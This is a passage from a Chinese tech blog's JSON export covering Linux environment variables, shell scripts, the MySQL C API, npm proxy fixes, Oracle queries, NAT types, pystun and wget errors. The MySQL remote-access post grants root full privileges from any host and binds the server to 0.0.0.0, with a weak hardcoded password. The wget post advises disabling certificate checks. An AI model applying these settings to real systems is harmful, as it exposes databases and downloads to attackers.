用户私有的、自定义的个性化设置、只针对该用户有效 按生存周期分类 永久环境变量 在环境变量脚本文件中配置，用户每次登录时会自动执行这些脚本，相当于永久有效 临时环境变量 使用时在Shell中临时定义，退出Shell后失效。 2.查看环境变量 1234567env //查看所有环境变量env | grep lan //用lan过滤环境变量echo $PATH //查看变量值 3.常用命名 1.PATH path为可执行环境的搜索目录，可执行程序包括Linux系统命令和用户的应用程序 2.LANG 3.HOSTNAME 服务器的主机名 4.SHELL 用户当前使用的Shell解析器 5.HISTSIZE 保存历史命令的条数 6.USER 当前登录用户的名字 7.HOME 当前登录用户的主目录 8.PWD 当前工作目录 9.CLASSPATH java语言库文件搜索的目录，它不是Linux缺省的环境变量，但对java程序员来说非常重要。 4.设置环境变量 1234567变量名=&apos;值&apos;export 变量名或者export 变量名=&apos;值&apos;如果环境变量的值中没有空格等特殊的字符，单引号可以不写 采用export配置的环境变量在退出Shell后环境变量将会失效。 系统环境变量 系统环境变量对全部要用户都生效，设置系统环境有三种方法。需要root用户权限 1.在/etc/profile文件中设置 用户登录时执行/etc/profile文件中设置系统的环境变量。但是不推荐使用 123vi /etc/profileexport VAR=&apos;hello&apos; 1使用 env $VAR查看环境变量的值 2.在/etc/profile文件目录中增加环境变量脚本文件,这是linux推荐的方法 1234cd /etc/profile.dvi var.sh //新建打开脚本文件var.shexport VAR=&apos;hello&apos; 12退出重新登录后，环境变量生效env $VAR 3.在/etc/bashrc文件中设置环境变量 1该文件配置的环境变量将会影响全部用户使用的bash shell 。但是不建议使用 123vi /etc/bashrcexport VAR=&apos;hello&apos; 12退出重新登录后，环境变量使用env $VAR 2.用户环境变量 在用户的主目录中，有几个特别的文件，用ls是看不见的，用ls .bash_*可以看见。设置用户环境变量有多种方法 .bash_profile(推荐首选) 当用户登录时执行，每个用户都可以使用该文件来配置专属自己的环境变量 1source .bash_profile //使环境变量生效 .bashrc 当用户登录时以及每次打开新的Shell文件时，该文件都将会被读取，不推荐里面配置用户专用的环境变量，因为每开一个Shell，该文件都会被读取一次，效率肯定受影响。 3. .bash_logout 当每次退出系统（退出bash shell）时执行该文件。 4. .bash_history 保存当前用户使用过的历史命令 环境变量脚本文件的执行顺序 /etc/profile --&gt; /etc/profile.d --&gt; /etc/bahrc --&gt; 用户的.bash_profile --&gt; 用户的.bashrc 如果同名的话，后面的环境变量会覆盖前面的环境变量 5.重要的环境变量 1.PATH环境 变量 1.PATH环境变量存放的是目录列表，目录之间用冒号 : 分隔，最后的原点 . 表示当前目录 1export PATH=目录1:目录2:目录3:......目录n:. 2.PATH缺省包含了linux系统命令所在的目录（/usr/local/bin:/usr/local/sbin:/usr/sbin），如果不包含这些目录,linux的常用命令也无法执行（要输入绝对路径才能执行）。 3.在用户的.bash_profile文件中，会对PATH进行扩充 2.LANG环境变量 LANG环境变量存放的是linux系统的语言、地区、字符集，它不需要系统管理员手工设置，/etc/profile会调用/etc/profile.d/lang.sh脚本完成对LANG的设置。 3.CLASSPATH java语言库文件搜索的目录，他不是linux缺省的环境变量，但对java程序员来说很重要。 CLASSPATH环境变量存放的也是目录列表，目录之间用冒号:分隔,最后的圆点.表示当前目录。","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"第一个shell脚本","slug":"第一个shell脚本","date":"2022-05-15T17:00:35.000Z","updated":"2022-05-15T17:05:47.232Z","comments":true,"path":"2022/05/16/第一个shell脚本/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/16/第一个shell脚本/","excerpt":"","text":"第一个shell脚本 打开文本编辑器(可以使用 vi/vim 命令来创建文件)，新建一个文件 test.sh，扩展名为 sh（sh代表shell），扩展名并不影响脚本执行。 第一步创建***.sh脚本文件 1vim ***.sh 输入一些代码，第一行一般是这样： 12#!/bin/bashecho &quot;Hello World !&quot; #!是一个约定的标记，它告诉系统这个脚本需要什么解释器来执行，即使用哪一种 Shell。 运行 Shell 脚本有两种方法： 1、作为可执行程序 将上面的代码保存为 test.sh，并 cd 到相应目录： 12chmod +x ./test.sh #使脚本具有执行权限./test.sh #执行脚本 注意，一定要写成./test.sh，而不是 test.sh，运行其它二进制的程序也一样，直接写 test.sh，linux 系统会去 PATH 里寻找有没有叫 test.sh 的，而只有 /bin,/sbin, /usr/bin，/usr/sbin 等在 PATH 里，你的当前目录通常不在 PATH 里，所以写成 test.sh 是会找不到命令的，要用 ./test.sh 告诉系统说，就在当前目录找。 2、作为解释器参数 这种运行方式是，直接运行解释器，其参数就是 shell 脚本的文件名，如： 1/bin/sh test.sh","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"MYSQL_API编程","slug":"MYSQL-API编程","date":"2022-05-15T15:55:00.000Z","updated":"2022-05-30T16:15:02.453Z","comments":true,"path":"2022/05/15/MYSQL-API编程/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/15/MYSQL-API编程/","excerpt":"","text":"访问MySQL服务器，这需要使用mysqlclient库，MySQL的大多数客户端API（除Java和.NET）都是通过这个库来和MySQL服务器通讯的，而这个库正是使用C语言编写的。 查看当前系统内所使用的mysql数据库版本信息 1mysql -V 需要用到的库 12345使用命令查找该库的路径find / -name libmysqlclient*命令可查看库内包含的函数。nm /usr/lib64/mysql/libmysqlclient.a 头文件 1用到头文件 &lt;mysql.h&gt; 可使用locate mysql.h查看其目录位置/usr/include/mysql/mysql.h。 编译引用了库的应用程序 1gcc 源文件名.c -o 程序名 -I/usr/include/mysql/ -L/usr/lib64/mysql/ -lmysqlclient MAKEFILE 12345678910src = $(wildcard *.c)target = $(patsubst %.c, %, $(src))inc_path = /usr/include/mysql/lib_path = /usr/lib64/mysql/all: $(target)%:%.c gcc $&lt; -o $@ -I$(inc_path) -L$(lib_path) -lmysqlclient -lstdc++ -lpthread -ldl -lrtclean: -rm -rf $(target).PHONY: all clean MySQL API常用函数 12345678910111213141516171819使用MySQL库API函数的一般步骤： a. 初始化. MYSQL *mysql_init(MYSQL *mysql) b. 错误处理 unsigned int mysql_errno(MYSQL *mysql) char *mysql_error(MYSQL *mysql); c. 建立连接. MYSQL *mysql_real_connect(MYSQL *mysql, const char *host, const char *user, const char *passwd,const char *db, unsigned int port, const char *unix_socket, unsigned long client_flag); d. 执行SQL语句 int mysql_query(MYSQL *mysql, const char *stmt_str) e. 获取结果 MYSQL_RES *mysql_store_result(MYSQL *mysql) MYSQL_ROW mysql_fetch_row(MYSQL_RES *result) f. 释放内存 void mysql_free_result(MYSQL_RES *result) g. 关闭连接 void mysql_close(MYSQL *mysql) 初始化 编写程序测试 初始化函数 1MYSQL *mysql_init(MYSQL *mysql); 其中有一种新数据类型MYSQL。可在头文件mysql.h → 263. typedef struct st_mysql {...} MYSQL;找到其定义。是一个结构体。 处理错误码的函数： 1unsigned int mysql_errno(MYSQL *mysql) 1234567891011121314151617#include &lt;stdio.h&gt;#include &quot;mysql.h&quot;int main(void)&#123; int i, ret = 0, num = 0; MYSQL *mysql = mysql_init(NULL); if (mysql == NULL) &#123; ret = mysql_errno(mysql); printf(&quot;mysql_init err:%d\\n&quot;, ret); return ret; &#125; printf(&quot;init ok...\\n&quot;); return 0;&#125; 1234567编译出错，原因是64位Linux环境下，动态库配置不完整。需手动指定编译所用的动态库。根据错误提示分析需要加入如下函数库：1. __gxx_personality_v0 --&gt; -lstdc++ 使用g++相关的环境2. dlclose/dlopen/dlsym --&gt; -ldl 完成用一个程序加载其他动态库的作用。3. pthread_* --&gt; -lpthread 线程库4. `my_getsystime&apos;/`clock_gettime&apos; --&gt; -lrt librt.so是glibc中对real-time的支持库 使用ldd命令可以查看该可执行文件运行所依赖的库文件。 连接数据库关闭连接 mysql_connect();但该函数已经过时，应该使用手册中推荐的mysql_real_connect函数取而代之。 1MYSQL *mysql_real_connect(MYSQL *mysql, const char *host, const char *user, const char *passwd, const char *db, unsigned int port, const char *unix_socket, unsigned long client_flag) ; ​ 根据手册中的描述，我们可以使用基础的链接方式与MySQL数据库建立连接。 1mysql = mysql_real_connect(mysql, &quot;localhost&quot;, &quot;root&quot;, &quot;123456&quot;, &quot;mydb61&quot;, 0, NULL, 0); ​ 连接数据库成功。对表中数据进行访问，访问结束需调用void mysql_close(MYSQL *mysql) 函数关闭连接。该函数在断开连接的同时，还可以解除分配由mysql指向的连接句柄。 1mysql_close(mysql); 读取数据 执行SQL语句 mysql_query函数不单单能完成查询sql的功能，还能完成非select语句在c程序中的执行。是一个十分万能的c程序中执行SQL语句的函数。并且该函数本身直接支持静态SQL。查询以\\0结尾的字符串。如果语句中包含二进制数据，则需要调用mysql_real_query来执行查询语句。 1函数原型：int mysql_query(MYSQL *mysql, const char *query); 成功返回0，失败返回非0 12char *psql = &quot;select * from emp&quot;;ret = mysql_query(mysql, psql); 若执行的是UPDATE, DELETE或INSERT语句，则可通过mysql_affected_rows()获知受影响的记录数。 若执行的是SELECT语句，查询结束后，查询结果被保存在mysql句柄中。需要使用获取结果集的API函数将结果集获取出来。有两种方式可以获取结果集。 注意: mysql_query执行的SQL语句不应为语句添加终结分号（‘;’）或“\\g”。 获取结果集 一种方式是通过mysql_store_result()将整个结果集全部取回来。另一种方式则是调用mysql_use_result()初始化获取操作，但暂时不取回任何记录。视结果集的条目数选择获取结果集的函数。两种方法均通过mysql_fetch_row()来访问每一条记录。 ​ MYSQL_RES *mysql_store_result(MYSQL *mysql) 成功返回MYSQL_RES结果集指针，失败返回NULL。 ​ MYSQL_RES是一个结构体类型，可以从mysql.h头文件中找到该结构体的定义： 1mysql.h → 308. typedef struct st_mysql_res &#123;...&#125; MYSQL_RES; 整体获取的结果集，保存在 MYSQL_RES 结构体指针中，通过检查mysql_store_result()是否返回NULL，可检测函数执行是否成功： 1234567MYSQL_RES *result = mysql_store_result(mysql);if (result == NULL) &#123; ret = mysql_errno(mysql); printf(&quot;mysql_store_result error: %s\\n&quot;, mysql_error(mysql)); return ret; &#125; 该函数调用成功，则SQL查询的结果被保存在result中，但我们不清楚有多少条数据。所以应使用游标的方式将结果集中的数据逐条取出。 解析结果集 通过游标一行一行fetch结果集中的数据。根据游标使用的一般特性，应使用循环结构，到达结尾或者出错，返回NULL。 ​ 函数原型：MYSQL_ROW mysql_fetch_row(MYSQL_RES *result)成功返回下一行的MYSQL_ROW结构。如果没有更多要检索的行或出现了错误，返回NULL。-----MYSQL_ROW定义在118行 ​ select * from emp 可以看到emp表一共有8列数据。可以循环将每行上每一列的数据显示到屏幕。 12345MYSQL_ROW row = NULL; //typedef char **MYSQL_ROW; while ((row = mysql_fetch_row(result)))&#123; printf(&quot;%s\\t%s\\t%s\\t%s\\t%s\\t%s\\t%s\\t%s\\n&quot;, row[0],row[1],row[2],row[3],row[4],row[5],row[6],row[7]);&#125; MYSQL_ROW的本质是typedef char ** MYSQL_ROW; 数据信息存储的形式如下图所示： 1从mysql.h头文件可查看MYSQL_ROW定义: 118. typedef char **MYSQL_ROW; /*return data as array of string*/ 从上图分析MYSQL_ROW为什么被定义为char**类型呢？推测mysq_fetch_row()的函数实现大致思想如下： 123456789101112char **mysql_fetch_row()&#123; char **tmp = (char **) malloc(sizeof(char *) * 8); for (i = 0; i &lt; 8; i++) &#123; tmp[i] = (char *)malloc(50); &#125; strcpy(tmp[0], &quot;7369&quot;); strcpy(tmp[1], &quot;SMITH&quot;); strcpy(tmp[2], &quot;CLERK&quot;); ... return tmp;&#125; 释放结果集 ​ 结果集处理完成，应调用对应的函数释放所占用的内存。 void mysql_free_result(MYSQL_RES *result);成功释放参数传递的结果集。没有失败情况。 1mysql_free_result(result); 获取列数 查看帮助手册可以看到，有两个函数具备获取列数的功能： 123unsigned int mysql_field_count(MYSQL *mysql) 从mysql句柄中获取有多少列。unsigned int mysql_num_fields(MYSQL_RES *result) 从返回的结果集中获取有多少列。 ​ 选择任意一种方式均可以完成该功能。 123456789int num = mysql_field_count(connect); while (row = mysql_fetch_row(result)) &#123;for (i = 0; i &lt; num; i++) &#123; printf(&quot;%s\\t&quot;, row[i]);&#125; printf(&quot;\\n&quot;); //printf(&quot;%s\\t%s\\t%s\\t%s\\t%s\\t%s\\t%s\\t%s\\n&quot;, row[0],row[1],row[2],row[3],row[4],row[5],row[6],row[7]); &#125; 获取表头 获取表头的API函数同样有两个： 123MYSQL_FIELD *mysql_fetch_fields(MYSQL_RES *result) 全部获取MYSQL_FIELD *mysql_fetch_field(MYSQL_RES *result) 获取单个 ​ MYSQL_FIELD也是一个结构体类型，其内部保存了选择列表项的信息，其中的name成员变量就保存着列名。可从头文件mysql.h中94-116行找到其定义。 123456MYSQL_FIELD *fields = NULL;fields = mysql_fetch_fields(result); //得到表头的结构体数组for (i = 0; i &lt; num; i++) &#123; //已通过 mysql_field_count 获取了总列数 printf(&quot;%s\\t&quot;, fields[i].name); //每一列的列名保存在name成员中 &#125;printf(&quot;\\n&quot;); 示例程序 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495//mysql获取结果集#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include \"mysql.h\"int main()&#123; //初始化 //MYSQL *mysql_init(MYSQL *mysql) MYSQL *mysql = mysql_init(NULL); if(mysql==NULL) &#123; printf(\"mysql init error\\n\"); return -1; &#125; printf(\"mysql init ok\\n\"); //连接mysql数据库 //MYSQL *mysql_real_connect(MYSQL *mysql, const char *host, const char *user, const char *passwd, const char *db, unsigned int port, const char *unix_socket, unsigned long client_flag) MYSQL *conn = mysql_real_connect(mysql, \"192.168.10.145\", \"root\", \"123456\", \"scott\", 0, NULL, 0); if(conn==NULL) &#123; printf(\"mysql_real_connect error,[%s]\\n\", mysql_error(mysql)); return -1; &#125; printf(\"connect mysql OK, [%p], [%p]\\n\", mysql, conn); //执行sql语句 //int mysql_query(MYSQL *mysql, const char *query) char sSQL[255] = \"select * from mytest\"; int ret = mysql_query(conn, sSQL); if(ret!=0) &#123; printf(\"mysql_query error, [%s]\\n\", mysql_error(mysql)); &#125; printf(\"mysql_query ok\\n\"); //获取列数 //unsigned int mysql_field_count(MYSQL *mysql) //unsigned int num = mysql_field_count(conn); //获取结果集 //MYSQL_RES *mysql_store_result(MYSQL *mysql) MYSQL_RES *results = mysql_store_result(conn); if(results==NULL) &#123; printf(\"mysql_store_result error,[%s]\\n\", mysql_error(mysql)); return -1; &#125; printf(\"mysql_store_result ok\\n\"); int i = 0; //获取列数 // unsigned int mysql_num_fields(MYSQL_RES *result) unsigned int num = mysql_num_fields(results); //获取表头信息---列名 //MYSQL_FIELD *mysql_fetch_fields(MYSQL_RES *result) MYSQL_FIELD *fields = mysql_fetch_fields(results); if(fields==NULL) &#123; printf(\"mysql_fetch_fields error,[%s]\\n\", mysql_error(mysql)); return -1; &#125; //打印表头信息 printf(\"+------+-----------+\\n\"); for(i=0; i&lt;num; i++) &#123; printf(\"%s\\t\", fields[i].name); &#125; printf(\"\\n\"); printf(\"+------+-----------+\\n\"); //获取结果集中每一行记录 MYSQL_ROW row; while((row=mysql_fetch_row(results))) &#123; for(i=0; i&lt;num; i++) &#123; printf(\"%s\\t\", row[i]); &#125; printf(\"\\n\"); &#125; printf(\"+------+-----------+\\n\"); //释放结果集 //void mysql_free_result(MYSQL_RES *result) mysql_free_result(results); //关闭数据库连接 mysql_close(conn); return 0;&#125;","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"npm报错，安装不上依赖，npm代理报错","slug":"npm报错，安装不上依赖，npm代理报错","date":"2022-05-15T02:02:17.000Z","updated":"2022-05-30T16:05:36.733Z","comments":true,"path":"2022/05/15/npm报错，安装不上依赖，npm代理报错/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/15/npm报错，安装不上依赖，npm代理报错/","excerpt":"","text":"npm报错：npm ERR! code ECONNREFUSED npm ERR! errno ECONNREFUSED，npm ERR! npm ERR! If you are behind a proxy, please make sure that the 在仓库上拉下来项目，安装依赖时报错： 1问题出现原因：Github相当于程序员的百度，但是速度有时又太慢，就使用了某VPN代理访问。结果，VPN给我开了一个端口，npm的一些依赖包访问速度巨慢，就出现了上图报错 解决方法 1. 查看代理 12npm config get proxynpm config get https-proxy 如果发现有代理，就清空它 12npm config delete proxynpm config delete https-proxy 2. 全局配置淘宝镜像 1npm install -g cnpm --registry=https://registry.npm.taobao.org 这里再安装依赖就OK了","categories":[{"name":"hexo","slug":"hexo","permalink":"https://xiaowuyoucy.github.io/categories/hexo/"}],"tags":[]},{"title":"ORACLE查看数据库的库名、实例名、域名、服务器以及服务名","slug":"ORACLE查看数据库的库名、实例名、域名、服务器以及服务名","date":"2022-05-15T02:00:15.000Z","updated":"2022-05-15T02:00:33.216Z","comments":true,"path":"2022/05/15/ORACLE查看数据库的库名、实例名、域名、服务器以及服务名/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/15/ORACLE查看数据库的库名、实例名、域名、服务器以及服务名/","excerpt":"","text":"123456789101112131415161718192021一、oracle中：1、查询数据库名：select name,dbid from v$database;或者show parameter db_name;2、查询实例名：select instance_name from v$instance;或者show parameter instance_name;3、查询数据库域名：select value from v$parameter where name=&apos;db_domain&apos;;或者show parameter domain;4、查询数据库服务器：select value from v$parameter where name=&apos;service_name&apos;;或者show parameter service;或者show parameter names;5、数据库服务名：此参数是数据库标识类参数，用service_name表示。数据库如果有域，则数据库服务名就是全局数据库名；如果没有，则数据库服务名就是数据库名。查询：show parameter service_name;二、一般在PL/SQL下，Oracle 用户查询其他用户的表一定要使用user.table格式才能查询，每次用户名.表名嫌麻烦的话。可以使用同义词，意思将user.table访问格式改成table格式即可创建同义词语句格式：create public synonym table_name for user.table_name;public很关键词，访问权限修饰，若想某表的授权用户也能用同义词查询，必须要用public访问修饰符。比如：原本&quot;表前缀.表名&quot;格式才能访问select * from PAASDATA.paas_city_def;create public synonym table_name for PAASDATA.paas_city_def;创建同义词后直接用表名即可select * from paas_city_def;————————————————版权声明：本文为CSDN博主「我冷漠」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/weixin_43748615/article/details/117766206","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"NAT的四种类型","slug":"NAT的四种类型","date":"2022-05-15T01:54:16.000Z","updated":"2022-05-15T01:58:36.536Z","comments":true,"path":"2022/05/15/NAT的四种类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/15/NAT的四种类型/","excerpt":"","text":"一：NAT类型 基于UDP的P2P应用需要考虑NAT的类型，因为不同的NAT组合的穿透的方式并不一致，有的能通， 有的不能通。一般来讲， NAT可以分为四种类型，分别是: 12345671, 全锥型(Full Cone)2, 受限锥型(Restricted Cone)， 或者说是IP受限锥型3, 端口受限锥型(Port Restricted Cone), 或者说是IP + PORT受限锥型4, 对称型(Symmetric) 其中1,2,3属于同一种类型，都是锥型，区别只是路由器的不同的安全策略。还有些NAT不属于这四种中的任何一种，就不在本文的讨论范围了。 二：为什么有四种类型的NAT NAT缓解了IPV4地址不够用的问题，同时也带了限制，那就是NAT外部的主机无法主动跟位于NAT内部的主机通信，NAT内部主机想要通信，必须主动和公网的一个IP通信，路由器负责建立一个映射关系，从而实现数据的转发， 这就是NAT的工作原理。 （一）NAT使用案例 1234567公网server1 ip是1.1.1.1， 监听端口是1111公网server2 ip是2.2.2.2， 监听端口是2222NAT router ip是8.8.8.8NAT内部client是192.168.0.3 client发送数据的时候，不管是tcp还是udp必须本地绑定一个端口，一般来讲，这个过程都是自动的。 假定client(192.168.0.3, 100)给 server(1.1.1.1, 1111)发送报文，报文到达路由器， 路由器在自己的公网ip上开辟一个端口800，从而建立了一个隐射关系(8.8.8.8, 800)&lt;—&gt;(192.168.0.3, 100), 建立映射关系后，所以(192.168.0.3, 100)和(1.1.1.1, 1111)之间的报文都通过这个映射关系进行转发。 （二）NAT之间主要的区别分两种情况讨论 1:client(192.168.0.3, 100)和server(1.1.1.1, 1111)在路由器上建立好映射关系后，如果client(192.168.0.3, 100)又给(2.2.2.2, 2222)发送数据，路由器该怎么处理呢? 1231, 复用旧的映射关系(8.8.8.8, 800)&lt;---&gt;(192.168.0.3, 100)和(2.2.2.2, 2222)通信, 这就是锥型(Cone) NAT---（分为下面的3个小类）2, 创建新的映射关系(8.8.8.8, 801)&lt;---&gt;(192.168.0.3, 100)和(2.2.2.2, 2222)通信, 这就是对称型NAT 注: (8.8.8.8, 801)只是举例，到底用什么端口取决于路由器的端口管理策略，总之是另外的一个端口，有的路由器有多个公网IP，不同的IP也会参与到这个映射关系中。 2:client(192.168.0.3, 100)和server(1.1.1.1, 1111)在路由器上建立好映射关系后，如果这个时候路由器(8.8.8.8)在800端口上收到从另外一台server(2.2.2.2, 2222)发来的数据，是不是应该转发给(192.168.0.3, 100)呢？ 有四种情况: 12345671, 无条件转发给(192.168.0.3, 100)， 这就是全锥型(Full Cone)NAT。2, 如果(192.168.0.3, 100)之前给(2.2.2.2)发送过数据，则转发， 这就是受限锥型(Restricted Cone)。3, 如果(192.168.0.3, 100)之前给(2.2.2.2, 2222)发送过数据，则转发， 这就是端口受限锥型(Port Restricted Cone)。4, 丢弃报文，拒绝转发, 这就是对称型NAT。 从上面也描述也可以看出，安全性系数, 对称型 &gt; 端口受限锥型 &gt; 受限锥型 &gt; 全锥型 （三）不同NAT的穿透性 对称nat无法穿透，这个说法不正确，对称nat与全椎full cone nat、对称nat 与 ip受限椎型cone，是可以穿透的，对称nat与 端口受限、对称nat与对称nat，不可穿透。 类型： 12341、full cone 全椎2、Restricted Cone ip受限3、port Restricted Cone 端口受限4、Symmetric 对称。 穿透关系：上述4种类型，如果定义他们的值为序列号，N为序列号相加。 12则N&lt;=6可穿透。2 和 4 序列相加 = 6 则可穿透。 3(端口受限)和4（对称）= 7 不可穿透。 三：p2p网络中的NAT穿透问题—NAT的原理和类型 （一）完全圆锥型NAT (Full Cane NAT) 完全圆锥型的NAT,将从同一内部IP地址和端口来的所有请求，都映射到相同的外部IP地址和端口。而且，任何外部主机通过向映射的外部地址发送报文，可以实现和内部主机进行通信。 这是一种比较宽松的策略，只要建立了内部网络的IP地址和端口与公网IP地址和端口的映射关系，则所有Internet上的主机都可以访问该NAT之后的主机！！！ 在图中，NAT会将内网地址{X:y} (x代表内网主机的IP地址，Y代表端口)映射成公网地址{A:b}(A代表映射的公网IP地址，b代表映射的端口)并绑定。任何数据分组都可以通过地址{A:b}送到此内网主机。 （二）受限圆锥型NAT ( Restricted Cone NAT)–IP受限 受限圆锥型NAT也是将从相同的内部IP地址和端口来的所有请求，映射到相同的公网IP地址和端口。 但是与完全圆锥型NAT不同，当且仅当内网主机之前己经向公网主机(假设IP地址为P)发送过数据分组，此公网主机才能够向内网主机发送数据分组。 在图中，NAT会将内网地址{x:y}映射成公网地址{A:b〕并绑定，只有源地址为P的分组才能和此内网主机通信。 （三）端口受限圆锥型NAT ( Port Restricted Cone NAT)–IP+port受限 类似于受限圆锥型NAT，但更严格。端口受限圆锥型NAT增加了端口号的限制，当且仅当内网主机之前已经向公网主机发送了数据分组，公网主机才能和此内网主机通信。 在图中，NAT会将内网地址{X:y}映射成公网地址{A:b}并绑定，由于内网主机之前己经分别与地址为M,端口为n的公网主机以及地址为P,端口为q的公网主机通信，所以只有来自这两个公网地址和端口的分组才能到达内网主机。 （四）对称型NAT CSymmetric NAT)----重点理解 对称型NAT把从同一内网地址和端口****到相同的地址和端口的所有请求，都映射到同一个公网地址和端口。 如果同一个内网主机，用相同的内网地址和端口向另一个地址发送数据分组，则会使用不同的映射，而且公网主机只有在接收到数据分组后，才能向与发送分组的内网主机进行通信。可见，对称性NAT是所有NAT类型中限制最为严格的。 在图中，对称型NAT会将内网地址{X:y}转换成公网地址{A:b}并绑定为{X:y}|{A:b}&lt;一&gt;{P:q}。这就意味着NAT只允许地址{A:b}接收来自{P:q}的分组，将它转给{X:y} 。当客户机请求一个不同的公网地址{M:n}时，NAT会新分配一个外部端口{C:d} 。","categories":[],"tags":[]},{"title":"Linux设备检测外部网络NAT类型","slug":"Linux设备检测外部网络NAT类型","date":"2022-05-15T01:53:07.000Z","updated":"2022-05-15T01:53:45.132Z","comments":true,"path":"2022/05/15/Linux设备检测外部网络NAT类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/15/Linux设备检测外部网络NAT类型/","excerpt":"","text":"在异地组网的过程中发现，对称型NAT(Symmetric NAT)对P2P穿透的支持很不好，因此在搭建P2P穿透个人使用的客户端或服务器之前有必要搞清楚自己所在网络环境的NAT类型。 Windows设备的NAT类型检测工具网上一搜一大把，而Linux的检测工具比较难找，这里提供一种方法和教程。 工具：pystun pystun是一个STUN客户端工具，用于获取局域网的NAT类型和公网IP。 A Python STUN client for getting NAT type and external IP (RFC 3489) 环境：centos8.2（理论上其他Linux发行版本也可以） 注意：必须要用python2.x的环境（推荐2.7），python3.x会报错 安装： 1wget https://files.pythonhosted.org/packages/a9/72/0b6a4f8ad71f72ed3b3946a21084a8b3c17de10ddc5fc0dfec43c48fc768/pystun-0.1.0.tar.gz 可能有更新的版本，pystun下载地址：https://pypi.python.org/pypi/pystun 1234tar -zxvf pystun-0.1.0.tar.gzcd pystun-0.1.0/dnf install python2 -ypython2 setup.py install 如果出现下面的情况： Traceback (most recent call last): File “setup.py”, line 2, in from setuptools import setup, find_packages ImportError: No module named setuptools centos： 1sudo dnf -y install python-setuptools ubuntu： 1sudo apt-get install python-setuptools 就可以解决。 1pystun 如果用的是python3.x则会出现下面的错误： Traceback (most recent call last): File “/usr/local/bin/pystun”, line 33, in sys.exit(load_entry_point(‘pystun==0.1.0’, ‘console_scripts’, ‘pystun’)()) File “/usr/local/lib/python3.6/site-packages/pystun-0.1.0-py3.6.egg/stun/cli.py”, line 55, in main stun_port=options.stun_port File “/usr/local/lib/python3.6/site-packages/pystun-0.1.0-py3.6.egg/stun/init.py”, line 253, in get_ip_info stun_host=stun_host, stun_port=stun_port) File “/usr/local/lib/python3.6/site-packages/pystun-0.1.0-py3.6.egg/stun/init.py”, line 186, in get_nat_type _initialize() File “/usr/local/lib/python3.6/site-packages/pystun-0.1.0-py3.6.egg/stun/init.py”, line 93, in _initialize dictValToAttr.update({items[i][1]: items[i][0]}) TypeError: ‘dict_items’ object does not support indexing 运行正常： [root@iZbp1fn5lyz904h3d2r8pnZ ~]# pystun NAT Type: Full Cone External IP: 121.196.xxx.xxx External Port: 5xxxx","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"解决ubuntu18.04安装mysql5.7无法远程连接的问题","slug":"解决ubuntu18-04安装mysql5-7无法远程连接的问题","date":"2022-05-15T01:48:31.000Z","updated":"2022-05-15T01:52:01.447Z","comments":true,"path":"2022/05/15/解决ubuntu18-04安装mysql5-7无法远程连接的问题/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/15/解决ubuntu18-04安装mysql5-7无法远程连接的问题/","excerpt":"","text":"遇到mysql本地连接成功,但远程连接不上的问题，无非从以下几个方面入手： 1、user表问题 mysql库中user表的root用户的host没有指定为%，而是默认的localhost，在mysql客户端执行如下操作即可 12345678910# 1、切换到mysql库use mysql;#2、查看root用户的host是不是 %,如果是localhost继续下面操作select user,authentication_string,host from user where user = &apos;root&apos;;# %为任意主机，就是任意主机可以通过用户名root + 密码 进行连接，你也可以指定只允许某IP的主机进行连接GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;密码&apos;;# 如果之前没有密码，最好再设置下密码，发现上面语句不会产生密码，否则后面连接可能会提示无权限需要更新客户端alter user &apos;root&apos;@&apos;%&apos; identified with mysql_native_password by &apos;密码&apos;;# mysql重新加载用户权限flush privileges; 2、防火墙问题 如果上面操作之后仍然无法远程连接mysql，就需要检查防火墙问题。我这里是ubuntu系统（其他系统自己找对应的指令） 首先查看了防火墙是否开启： 12# 查看防火墙状态ufw status 发现并没有开启，因此排除防火墙问题。 3、3306端口开放的问题 如果3306端口没有开发也会导致无法远程连接，通过指令发现3306开放了。 1netstat -tunlp 但是仔细看图，有一点奇怪，就是它开放的是127.0.0.1:3306而不是0.0.0.0:3306，这才是本次问题的突破点，127.0.0.1:3306只对本机开放访问，其他ip都不行，那么该怎么解决呢？重点来了~ 1）由于是apt在线安装的，mysql在目录/etc/mysql/mysql.conf.d下有个默认配置文件mysqld.cnf，打开编辑发现： 2）原来罪魁祸首就在这里，bind-address绑定的ip是127.0.0.1，我们只需将127.0.0.1改为0.0.0.0表示任意ip主机都能访问即可： 3）最后，重启mysql服务即可。","categories":[{"name":"数据库","slug":"数据库","permalink":"https://xiaowuyoucy.github.io/categories/数据库/"}],"tags":[]},{"title":"解决wget不能下载https文件问题","slug":"解决wget不能下载https文件问题","date":"2022-05-15T01:45:22.000Z","updated":"2022-05-15T01:47:07.546Z","comments":true,"path":"2022/05/15/解决wget不能下载https文件问题/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/05/15/解决wget不能下载https文件问题/","excerpt":"","text":"使用wget下载https协议的文件时遇到了这个问题，提示： 12345ERROR: cannot verify xx.xx.com&apos;s certificate, issued by `/C=BE/O=GlobalSign nv-sa/CN=GlobalSign Organization Validation CA - SHA256 - G2&apos;: Unable to locally verify the issuer&apos;s authority.ERROR: certificate common name `*.alicdn.com&apos; doesn&apos;t match requested host name `xx.xx.com&apos;.To connect to xx.xx.com insecurely, use `--no-check-certificate&apos;.无法建立 SSL 连接。 错误提示中建议使用“–no-check-certificate”参数，用法是这样的： 1wget https://xx.xx.com/xx.exe 